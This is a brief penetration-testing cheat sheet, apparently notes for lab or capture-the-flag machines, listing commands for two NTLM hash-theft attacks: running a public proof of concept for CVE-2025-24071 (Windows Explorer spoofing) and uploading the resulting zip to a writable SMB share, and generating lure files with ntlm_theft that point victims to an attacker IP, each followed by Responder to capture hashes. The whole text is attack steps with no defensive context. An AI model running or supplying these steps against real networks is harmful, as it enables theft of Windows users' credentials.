# Windows Explorer Spoofing
```powershell
Condition: Have at least 1 writable SMB share

$ git clone https://github.com/0x6rss/CVE-2025-24071_PoC.git
$ cd CVE-2025-24071_PoC
$ python3 poc.py

smb: \> put exploit.zip

$ sudo responder -I tun0
```

# NTLM Theft
```powershell
git clone https://github.com/Greenwolf/ntlm_theft

python3 ntlm_theft.py -g all -s 10.10.14.66 -f media
sudo responder -I tun0 
```
